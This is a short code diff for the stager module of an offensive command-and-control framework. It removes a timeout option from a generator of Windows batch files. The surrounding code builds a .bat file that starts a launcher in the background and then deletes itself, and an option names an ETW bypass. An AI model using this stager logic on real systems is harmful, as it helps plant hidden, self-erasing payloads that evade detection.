@@ -66,11 +66,6 @@ class Stager(object):
                 "Required": False,
                 "Value": "mattifestation etw",
             },
-            "Timeout": {
-                "Description": "Time to wait before closing window. Setting to 0 will risk closing the process before it runs.",
-                "Required": True,
-                "Value": "10",
-            },
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -90,7 +85,6 @@ class Stager(object):
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
         language = self.options["Language"]["Value"]
-        timeout = self.options["Timeout"]["Value"]
 
         if obfuscate.lower() == "true":
             obfuscate = True
@@ -140,7 +134,6 @@ class Stager(object):
         else:
             code = "@echo off\n"
             code += "start /b " + launcher + "\n"
-            code += f"timeout {timeout}\n"
             if delete.lower() == "true":
                 # code that causes the .bat to delete itself
                 code += '(goto) 2>nul & del "%~f0"\n'
